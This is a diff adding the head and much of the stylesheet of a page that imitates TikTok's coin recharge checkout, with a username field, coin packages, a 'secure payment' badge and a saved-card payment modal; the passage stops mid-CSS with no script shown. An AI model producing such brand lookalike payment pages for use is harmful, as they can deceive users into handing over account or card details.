@@ -1,0 +1,3052 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Get Coins</title>
+    <!-- 网页图标及应用图标设置 -->
+    <!-- 设置浏览器标签页小图标，32x32 和 16x16 -->
+    <link rel="icon" type="image/png" sizes="32x32" href="./img/tiktokweb.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="./img/tiktokweb.png">
+    
+    <!-- iOS 主屏幕图标 -->
+    <link rel="apple-touch-icon" sizes="180x180" href="./img/tiktokweb.png">
+    
+    <!-- Web 应用清单（Manifest） -->
+    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiVGlrVG9rIFJlY2hhcmdlIiwic2hvcnRfbmFtZSI6IlRpa1RvayIsImRlc2NyaXB0aW9uIjoiVGlrVG9rIENvaW4gUmVjaGFyZ2UgU3lzdGVtIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJzdGFydF91cmwiOiIvIiwiaWNvbnMiOlt7InNyYyI6Ii4vaW1nL3Rpa3Rva3dlYi5wbmciLCJzaXplcyI6IjE5MngxOTIiLCJ0eXBlIjoiaW1hZ2UvcG5nIn1dfQ==">
+    
+    <!-- 针对 iOS 的相关 meta 标签 -->
+    <meta name="apple-mobile-web-app-capable" content="yes"> <!-- 允许网站以应用模式运行（全屏） -->
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> <!-- 状态栏样式为黑色半透明 -->
+    <meta name="apple-mobile-web-app-title" content="TikTok"> <!-- 添加到主屏幕时的应用标题 -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: #f8f8f8;
+            color: #161823;
+        }
+
+        /* 顶部导航栏 */
+        .navbar {
+            background: white;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.06);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 12px 24px;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 28px;
+            font-weight: 700;
+            text-decoration: none;
+            color: #161823;
+            justify-self: start;
+        }
+
+        .search-container {
+            position: relative;
+            justify-self: center;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 10px 40px 10px 16px;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 92px;
+            background: #f1f1f2;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .search-input:focus {
+            border-color: rgba(22, 24, 35, 0.2);
+        }
+
+        .search-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .search-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            justify-self: end;
+        }
+
+        .upload-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            background: white;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .upload-btn:hover {
+            background: #f8f8f8;
+        }
+
+        .nav-icon {
+            font-size: 24px;
+            cursor: pointer;
+            padding: 6px;
+        }
+
+        .user-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* 主内容区域 */
+        .main-container {
+            max-width: 1000px;
+            margin: 32px auto;
+            padding: 0 24px;
+            position: relative;
+        }
+
+        .content-wrapper {
+            background: white;
+            border-radius: 8px;
+            padding: 32px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            position: relative;
+        }
+
+        /* 标题区域 */
+        .header-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .transaction-link {
+            color: #161823;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 700;
+        }
+
+        .transaction-link:hover {
+            text-decoration: underline;
+        }
+
+        /* 用户信息卡片 */
+        .user-card {
+            margin-bottom: 24px;
+        }
+
+        .user-info {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: #f8f8f8;
+            border-radius: 8px;
+            padding: 16px;
+        }
+
+        .secure-payment-badge {
+            display: none;
+        }
+
+        .user-card-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .user-details h3 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .coin-balance {
+            display: none;
+            align-items: center;
+            gap: 4px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .user-info-arrow {
+            display: none;
+        }
+
+        .tiktok-logo {
+            display: none;
+        }
+
+        /* 充值提示 */
+        .recharge-notice {
+            margin-bottom: 20px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .recharge-notice .label {
+            color: #161823;
+            font-weight: 700;
+        }
+
+        .recharge-notice .highlight {
+            color: #fe2c55;
+            font-weight: 700;
+        }
+
+        .info-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 16px;
+            height: 16px;
+            color: rgba(22, 24, 35, 0.34);
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        
+        .info-icon:hover {
+            color: rgba(22, 24, 35, 0.5);
+        }
+
+        /* 用户名输入框 */
+        .username-input-wrapper {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .username-input {
+            width: 100%;
+            padding: 12px 16px 12px 48px;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 8px;
+            background: #f8f8f8;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .username-input:focus {
+            border-color: rgba(22, 24, 35, 0.2);
+            background: white;
+        }
+
+        .username-input::placeholder {
+            color: rgba(22, 24, 35, 0.34);
+        }
+
+        .username-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(22, 24, 35, 0.34);
+        }
+
+        /* 粘贴按钮 - 桌面端隐藏 */
+        .paste-btn {
+            display: none;
+        }
+
+        /* 金币选项网格 */
+        .coin-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .coin-option {
+            border: 2px solid #e8e8e8;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: #f8f8f8;
+        }
+
+        .coin-option:hover {
+            border-color: #fe2c55;
+            transform: translateY(-2px);
+        }
+
+        .coin-option.selected {
+            border-color: #fe2c55;
+            background: #fff5f5;
+        }
+
+        .coin-amount {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            min-height: 32px;
+        }
+
+        .coin-icon {
+            font-size: 28px;
+            flex-shrink: 0;
+        }
+
+        .coin-price {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .custom-note {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        .custom-input {
+            width: calc(100% - 40px);
+            border: none;
+            border-bottom: 2px solid #161823;
+            outline: none;
+            background: transparent;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            color: #161823;
+            font-family: inherit;
+            padding: 0 8px;
+            margin: 0;
+            height: 28px;
+            line-height: 28px;
+        }
+
+        .custom-input::placeholder {
+            color: #999;
+            font-weight: 400;
+            font-size: 16px;
+        }
+
+        /* 隐藏number类型输入框的上下箭头 */
+        .custom-input::-webkit-outer-spin-button,
+        .custom-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .custom-input[type=number] {
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+
+        .custom-option .coin-amount {
+            position: relative;
+            justify-content: center;
+        }
+
+        .custom-option.selected .coin-amount {
+            justify-content: flex-start;
+        }
+
+        .custom-option.selected .custom-label {
+            display: none;
+        }
+
+        .custom-option.selected .custom-input {
+            display: inline-block !important;
+        }
+
+        .custom-option.selected .coin-icon {
+            margin-right: 0;
+        }
+
+        .custom-option .custom-note {
+            color: #999;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .custom-option.selected .custom-note {
+            text-align: center;
+        }
+
+        /* Special offer */
+        .special-offer {
+            background: #f8f8f8;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .special-offer-title {
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .special-offer-value {
+            color: #fe2c55;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .mobile-text {
+            display: none;
+        }
+
+        .desktop-text {
+            display: inline;
+        }
+
+        /* 支付方式 */
+        .payment-section {
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .payment-label {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+
+        .payment-methods img {
+            height: 14px;
+            object-fit: contain;
+        }
+
+        /* 总计 */
+        .total-section {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .total-amount {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        /* 充值按钮 */
+        .recharge-btn {
+            width: auto;
+            min-width: 220px;
+            max-width: 360px;
+            padding: 12px 32px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .recharge-btn:hover {
+            background: #e02549;
+        }
+
+        .recharge-btn:active {
+            transform: translateX(-50%) scale(0.98);
+        }
+
+        .mobile-btn-text {
+            display: none;
+        }
+
+        .desktop-btn-text {
+            display: inline;
+        }
+
+        .mobile-btn-icon {
+            display: none;
+        }
+
+        /* 底部支付面板容器 - 桌面端正常流 */
+        .bottom-payment-panel {
+            display: block;
+        }
+
+        /* 侧边栏图标 */
+        .sidebar-actions {
+            position: fixed;
+            right: calc(50% - 500px - 24px - 30px);
+            bottom: 50px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        @media (max-width: 1200px) {
+            .sidebar-actions {
+                right: 24px;
+            }
+        }
+
+        .sidebar-icon {
+            width: 48px;
+            height: 48px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            transition: all 0.2s;
+        }
+
+        .sidebar-icon:hover {
+            transform: scale(1.1);
+        }
+
+        /* 底部邀请卡片 */
+        .bottom-invite {
+            max-width: 1000px;
+            margin: 24px auto;
+            padding: 0 24px;
+        }
+
+        .invite-card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .invite-card:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .invite-card-content {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .invite-icon {
+            font-size: 48px;
+        }
+
+        .invite-card-text h3 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .invite-card-text p {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .arrow-icon {
+            font-size: 24px;
+            color: #999;
+        }
+
+        /* 移动端顶部栏 */
+        .mobile-header {
+            display: none;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: #f8f8f8;
+            padding: 16px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .mobile-header > * {
+            position: relative;
+        }
+
+        .mobile-header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #161823;
+            margin: 0;
+            text-align: center;
+        }
+
+        .mobile-header-icons {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .mobile-header-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: #161823;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+
+        .add-to-home {
+            display: none;
+            background: white;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 16px;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+
+        .add-to-home-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .add-to-home-icon {
+            width: 48px;
+            height: 48px;
+            background: #e8f4ff;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .add-to-home-text h3 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .add-to-home-text p {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .add-btn {
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 6px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .tiktok-logo-container {
+            display: none;
+        }
+
+        .redeem-card {
+            display: none;
+            background: white;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 0 16px 16px;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            cursor: pointer;
+        }
+
+        .redeem-card span {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 968px) {
+            .coin-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            
+            .navbar-inner {
+                grid-template-columns: auto 1fr auto;
+            }
+            
+            .search-container {
+                max-width: 350px;
+            }
+        }
+
+        @media (max-width: 640px) {
+            /* 隐藏桌面导航栏 */
+            .navbar {
+                display: none;
+            }
+
+            /* 显示移动端头部 */
+            .mobile-header {
+                display: flex;
+            }
+
+            .add-to-home {
+                display: flex;
+                margin: 8px 16px;
+            }
+
+            .tiktok-logo-container {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 12px 0;
+                margin: 0 16px;
+            }
+
+            .redeem-card {
+                display: none;
+            }
+
+            /* 主容器调整 */
+            .main-container {
+                margin: 0;
+                padding: 0;
+            }
+
+            .content-wrapper {
+                padding: 1px 16px 1px 16px;
+                border-radius: 0;
+                box-shadow: none;
+                background: #f8f8f8;
+            }
+
+            /* 隐藏桌面版标题 */
+            .header-section {
+                display: none;
+            }
+            
+            /* 用户卡片调整 */
+            .user-card {
+                margin-bottom: 16px;
+                background: white;
+                border-radius: 8px;
+                overflow: hidden;
+            }
+
+            .secure-payment-badge {
+                display: flex;
+                justify-content: center;
+            }
+
+            .secure-payment-content {
+                display: inline-flex;
+                justify-content: center;
+                align-items: center;
+                gap: 3px;
+                padding: 2px 16px 3px;
+                height: 17px;
+                background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxNyIgdmlld0JveD0iMCAwIDE1OSAxNyIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJub25lIj4KPHBhdGggZD0iTTAuNSAwSDE1OC41TDE1Mi42NjIgMTIuNDA2NEMxNTEuMzQyIDE1LjIxMDMgMTQ4LjUyMiAxNyAxNDUuNDIzIDE3SDEzLjU3NjhDMTAuNDc3OSAxNyA3LjY1NzggMTUuMjEwMyA2LjMzODI5IDEyLjQwNjRMMC41IDBaIiBmaWxsPSIjMEJFMDlCIiBmaWxsLW9wYWNpdHk9IjAuMTIiLz4KPC9zdmc+Cg==");
+                background-size: 100% 100%;
+                background-repeat: no-repeat;
+                color: #008568;
+                box-sizing: border-box;
+            }
+
+            .secure-payment-content svg {
+                flex-shrink: 0;
+                width: 10px;
+                height: 10px;
+            }
+
+            .secure-payment-content strong {
+                font-size: 11px;
+                font-weight: 600;
+                white-space: nowrap;
+                line-height: 1;
+            }
+
+            .user-card-avatar {
+                width: 56px;
+                height: 56px;
+            }
+
+            .user-details {
+                display: none;
+            }
+
+            .user-details h3 {
+                font-size: 16px;
+                margin-bottom: 4px;
+            }
+
+            .coin-balance {
+                font-size: 12px;
+                display: flex !important;
+                align-items: center;
+                flex-wrap: nowrap;
+                gap: 6px;
+                color: #666;
+            }
+
+            .coin-balance svg {
+                width: 16px;
+                height: 16px;
+                flex-shrink: 0;
+            }
+
+            .coin-balance .divider {
+                color: rgba(22, 24, 35, 0.2);
+                margin: 0 2px;
+            }
+
+            .coin-balance > span {
+                white-space: nowrap;
+                display: inline-flex;
+                align-items: center;
+                gap: 4px;
+            }
+
+            .user-info {
+                background: white !important;
+                display: flex;
+                align-items: center;
+                gap: 12px;
+                width: 100%;
+                position: relative;
+                padding: 12px;
+                border-radius: 0;
+            }
+
+            .user-info-arrow {
+                position: absolute;
+                right: 12px;
+                top: 50%;
+                transform: translateY(-50%);
+                color: rgba(22, 24, 35, 0.34);
+                font-size: 18px;
+                display: flex;
+                align-items: center;
+            }
+
+            .tiktok-logo {
+                display: flex;
+                align-items: center;
+                margin-right: auto;
+            }
+
+            /* 充值提示调整 */
+            .recharge-notice {
+                background: white;
+                padding: 12px;
+                border-radius: 8px;
+                margin-bottom: 16px;
+                font-size: 13px;
+                flex-direction: row;
+                align-items: flex-start;
+                gap: 4px;
+                flex-wrap: wrap;
+            }
+
+            .recharge-notice .label {
+                font-size: 14px;
+                font-weight: 700;
+                color: #161823;
+                width: 100%;
+                margin-bottom: 4px;
+            }
+
+            .recharge-notice .highlight {
+                font-size: 12px;
+                font-weight: 500;
+                white-space: nowrap;
+                flex: 1;
+            }
+
+            .recharge-notice .info-icon {
+                flex-shrink: 0;
+                margin-left: 4px;
+            }
+
+            /* 用户名输入框 - 移动端样式 */
+            .username-input-wrapper {
+                margin-bottom: 8px;
+                background: white;
+                border-radius: 8px;
+                padding: 0;
+            }
+
+            .username-input {
+                padding: 12px 16px 12px 48px;
+                border: none;
+                border-radius: 8px;
+                background: white;
+                font-size: 14px;
+                cursor: default;
+                user-select: none;
+                -webkit-user-select: none;
+                pointer-events: none;
+            }
+
+            .username-input:focus {
+                outline: none;
+                background: white;
+            }
+
+            .username-icon {
+                left: 16px;
+            }
+
+            /* 粘贴按钮 - 仅在移动端显示 */
+            .paste-btn {
+                position: absolute;
+                right: 12px;
+                top: 50%;
+                transform: translateY(-50%);
+                width: 64px;
+                height: 32px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: transparent;
+                border: none;
+                cursor: pointer;
+                color: rgba(22, 24, 35, 0.5);
+                transition: all 0.2s;
+                padding: 4px;
+                border-radius: 4px;
+            }
+
+            .paste-btn:hover {
+                background: rgba(22, 24, 35, 0.06);
+                color: rgba(22, 24, 35, 0.75);
+            }
+
+            .paste-btn:active {
+                background: rgba(22, 24, 35, 0.1);
+            }
+
+            .paste-btn svg {
+                width: 20px;
+                height: 20px;
+            }
+
+            .username-input {
+                padding-right: 48px; /* 为粘贴按钮留出空间 */
+            }
+
+            /* 金币选项网格 */
+            .coin-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 8px;
+                margin-bottom: 0px;
+                background: white;
+                border-radius: 8px;
+                padding: 12px;
+            }
+
+            .coin-option {
+                padding: 12px 6px;
+                background: #f8f8f8;
+                border: 2px solid rgba(22, 24, 35, 0.12);
+                border-radius: 8px;
+                transition: all 0.1s;
+            }
+
+            /* 隐藏7,000和17,500选项（第6和第7个选项） */
+            .coin-option:nth-child(6),
+            .coin-option:nth-child(7) {
+                display: none;
+            }
+
+            .coin-option.selected {
+                border-color: #fe2c55;
+                background: #fff5f5;
+            }
+
+            .coin-amount {
+                font-size: 18px;
+                margin-bottom: 0px;
+                font-weight: 700;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 4px;
+            }
+
+            .coin-icon {
+                font-size: 22px;
+            }
+
+            .coin-price {
+                font-size: 11px;
+                color: #666;
+            }
+
+            .custom-note {
+                display: none;
+            }
+
+            .custom-label {
+                font-size: 16px;
+                font-weight: 700;
+                color: #161823;
+            }
+
+            /* 手机视口下强制隐藏输入框，不变成输入模式 */
+            .custom-option .custom-input,
+            .custom-option.selected .custom-input {
+                display: none !important;
+            }
+
+            /* 手机视口下Custom选项始终显示label */
+            .custom-option.selected .custom-label {
+                display: inline !important;
+            }
+
+            /* 让Custom选项内容上下居中 */
+            .custom-option {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .custom-option .coin-amount {
+                justify-content: center !important;
+            }
+
+            .custom-option .coin-amount {
+                min-height: 28px;
+            }
+
+            /* 底部邀请卡片 */
+            .bottom-invite {
+                margin: 8px 0;
+                padding: 0 16px;
+            }
+
+            .invite-card {
+                padding: 12px 16px;
+                background: white;
+            }
+
+            .invite-card-content img {
+                width: 48px;
+                height: auto;
+            }
+
+            .invite-card-text h3 {
+                font-size: 15px;
+            }
+
+            .invite-card-text p {
+                font-size: 12px;
+            }
+
+            /* 底部支付面板 - 移动端固定在底部 */
+            .bottom-payment-panel {
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                background: white;
+                z-index: 100;
+                box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.08);
+                padding: 12px 16px 16px;
+            }
+
+            /* Special offer调整 */
+            .special-offer {
+                margin: 0 0 12px 0;
+                padding: 0;
+                flex-direction: row;
+                align-items: center;
+                gap: 8px;
+                background: transparent;
+                justify-content: space-between;
+            }
+
+            .special-offer-title {
+                font-size: 13px;
+                color: #666;
+                flex: 0 0 auto;
+            }
+
+            .special-offer-title svg {
+                display: none;
+            }
+
+            .special-offer-value {
+                font-size: 13px;
+                color: #fe2c55;
+                font-weight: 600;
+                flex: 0 0 auto;
+                text-align: right;
+                display: flex;
+                align-items: center;
+                justify-content: flex-end;
+                gap: 4px;
+            }
+
+            .special-offer-value svg {
+                transform: rotate(-90deg);
+                flex-shrink: 0;
+            }
+
+            .mobile-text {
+                display: inline;
+            }
+
+            .desktop-text {
+                display: none;
+            }
+
+            /* 支付方式调整 */
+            .payment-section {
+                margin: 0 0 12px 0;
+                flex-wrap: wrap;
+                background: transparent;
+                padding: 0;
+                border-radius: 0;
+                justify-content: center;
+            }
+
+            .payment-label {
+                display: none;
+            }
+
+            .payment-methods {
+                flex-wrap: wrap;
+                justify-content: center;
+                width: 100%;
+            }
+
+            .payment-methods img {
+                height: 16px;
+                margin: 3px;
+            }
+
+            /* 隐藏总计 */
+            .total-section {
+                display: none;
+            }
+
+            /* 充值按钮 */
+            .recharge-btn {
+                width: auto;
+                max-width: none;
+                padding: 12px 32px;
+                position: relative;
+                bottom: auto;
+                left: 50%;
+                right: auto;
+                transform: translateX(-50%);
+                border-radius: 8px;
+                font-size: 16px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                z-index: auto;
+                min-width: 300px;
+            }
+
+            .desktop-btn-text {
+                display: none;
+            }
+
+            .mobile-btn-icon {
+                display: inline-block;
+                font-size: 18px;
+            }
+
+            .mobile-btn-text {
+                display: inline;
+            }
+
+            .recharge-btn .mobile-btn-text::before {
+                content: 'Buy for ';
+            }
+
+            .recharge-btn .mobile-btn-text::after {
+                content: attr(data-price);
+            }
+
+            body {
+                /* padding-bottom: 160px; */
+                background: #f8f8f8;
+            }
+
+            /* .content-wrapper {
+                min-height: calc(100vh - 120px);
+            } */
+
+            /* 隐藏侧边栏 */
+            .sidebar-actions {
+                display: none;
+            }
+
+            /* 安全标签隐藏 */
+            .content-wrapper > svg {
+                display: none;
+            }
+        }
+
+        /* 弹窗样式 */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+        }
+
+        .modal-header {
+            padding: 24px 24px 16px;
+            border-bottom: 1px solid #e8e8e8;
+            position: relative;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #161823;
+            margin: 0;
+        }
+
+        .modal-close {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            width: 32px;
+            height: 32px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 24px;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .modal-close:hover {
+            background: #f1f1f2;
+            color: #161823;
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            font-size: 15px;
+        }
+
+        .order-row.account {
+            color: #666;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e8e8e8;
+        }
+
+        .order-row.coins {
+            padding-top: 20px;
+        }
+
+        .order-row.total {
+            font-size: 16px;
+            font-weight: 600;
+            padding-top: 16px;
+            border-top: 1px solid #e8e8e8;
+            margin-top: 8px;
+        }
+
+        .order-value {
+            font-weight: 600;
+            color: #161823;
+        }
+
+        .payment-method-section {
+            margin-top: 24px;
+        }
+
+        .payment-method-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #161823;
+        }
+
+        .payment-method-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 12px;
+        }
+
+        .saved-card {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            border: 2px solid #e8e8e8;
+            border-radius: 8px;
+            background: #f8f8f8;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 16px;
+        }
+
+        .saved-card:hover {
+            border-color: #fe2c55;
+            background: #fff5f5;
+        }
+
+        .saved-card.selected {
+            border-color: #fe2c55;
+            background: #fff5f5;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card-icon img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .card-info {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .card-number {
+            color: #161823;
+        }
+
+        .radio-check {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #e8e8e8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .saved-card.selected .radio-check {
+            border-color: #fe2c55;
+            background: #fe2c55;
+        }
+
+        .saved-card.selected .radio-check::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .pay-btn {
+            width: 100%;
+            padding: 14px 32px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+
+        .pay-btn:hover {
+            background: #e02549;
+        }
+
+        .pay-btn:active {
+            transform: scale(0.98);
+        }
+
+        .modal-total {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 16px;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #e8e8e8;
+        }
+
+        .modal-total-label {
+            font-weight: 600;
+        }
+
+        .modal-total-amount {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        @media (max-width: 640px) {
+            .modal-content {
+                width: 95%;
+                max-height: 95vh;
+            }
+
+            .modal-header {
+                padding: 20px 20px 12px;
+            }
+
+            .modal-body {
+                padding: 20px;
+            }
+
+            .modal-title {
+                font-size: 20px;
+            }
+        }
+
+        /* 支付处理弹窗样式 */
+        .payment-processing-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1001;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .payment-processing-modal.active {
+            display: flex;
+        }
+
+        .payment-processing-content {
+            background: white;
+            border-radius: 12px;
+            padding: 60px 80px;
+            text-align: center;
+            max-width: 500px;
